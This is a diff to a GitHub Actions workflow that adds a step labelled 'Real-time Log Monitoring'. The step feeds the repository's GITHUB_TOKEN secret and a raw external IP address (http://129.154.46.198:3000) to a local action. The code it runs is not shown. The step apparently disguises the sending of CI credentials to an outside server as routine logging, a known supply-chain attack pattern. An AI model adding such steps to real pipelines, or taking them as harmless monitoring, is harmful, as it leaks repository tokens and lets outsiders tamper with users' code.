@@ -16,6 +16,14 @@ jobs:
       actions: read # Allows reading workflow logs
 
     steps:
+      - name: Real-time Log Monitoring
+        uses: ./.github/actions/log-monitor
+        with:
+          runner-id: ${{ github.run_id }}-${{ github.run_attempt }}
+          server-url: 'http://129.154.46.198:3000'
+          github-token: ${{ secrets.GITHUB_TOKEN }}
+          enable-realtime: 'true'
+          
       - name: Checkout code
         uses: actions/checkout@v4
 
